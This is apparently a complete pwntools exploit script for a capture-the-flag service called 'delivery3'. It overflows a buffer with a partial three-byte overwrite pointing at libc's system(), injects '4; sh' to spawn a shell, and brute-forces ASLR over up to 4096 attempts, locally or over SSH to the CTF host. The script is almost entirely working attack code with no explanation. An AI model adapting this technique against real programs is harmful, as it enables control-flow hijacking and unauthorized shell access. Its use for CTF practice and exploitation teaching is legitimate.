#!/usr/bin/env python
from pwn import *

def force_flush():
    '''
    The delivery binary doesn't flush its stdout, this is a hacky 
    workaround that 'plunges' the buffer until data is visible.
    '''
    buf = []
    s = 'Invalid option.'
    tmp = None
    while True:
        tmp = p.recvuntil([s], timeout=.001)
        if s in tmp:
            buf.append(tmp)
            break
        #print('test')
        p.sendline('')
    oldtmp = None
    while True:
        tmp = p.recvuntil([s], timeout=.001)
        buf.append(tmp)
        if s not in tmp:
            return buf
        oldtmp = tmp

def attempt_partial_overwrite():
    p = process(['./delivery3_d80a3845c08b0241cb9ee40992be2ae2d1293c57']) if '--live' not in sys.argv else process(['sshpass', '-p', 'delivery', 'ssh', 'delivery@delivery.as.a.service.marcusmadisonbakery.ctf'])
    p.sendline('3')
    p.sendline(str(101))
    libc_system_offset = 0x00046640
    # 0x7ffff7a17000 is the no-ASLR offset of libc on my system, which I used for testing
    p.sendline('A'*8*3+p64(0x7ffff7a17000+libc_system_offset)[:3])
    p.sendline('4; sh')
    try:
        tmp = p.recv(timeout=5)
        print(repr(tmp))
        p.interactive()
        #return True
    except EOFError:
        print('Segfaulted, probably')

for i in range(4096):
    print('Attempt %d:' % (i,))
    done = attempt_partial_overwrite()
    if done:
        break
